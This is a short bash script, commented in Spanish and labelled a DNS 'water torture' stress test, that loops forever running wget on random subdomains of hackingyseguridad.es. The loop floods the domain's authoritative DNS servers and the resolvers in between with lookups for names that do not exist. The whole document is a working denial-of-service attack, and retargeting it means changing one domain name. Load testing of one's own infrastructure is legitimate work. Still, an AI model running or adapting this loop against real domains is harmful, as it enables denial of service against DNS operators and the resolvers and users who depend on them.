#!/bin/bash
# TEST DE STRESS DNS WATER TORTURE CON WGET
# Antonio Taboada 15/01/2017
# Aplicar permisos con chmod +x watertorturewget.sh
# Ejecutar ./watertorturewget.sh
# Para parar Control + C

while true; do
        wget -O /dev/null $RANDOM.hackingyseguridad.es
done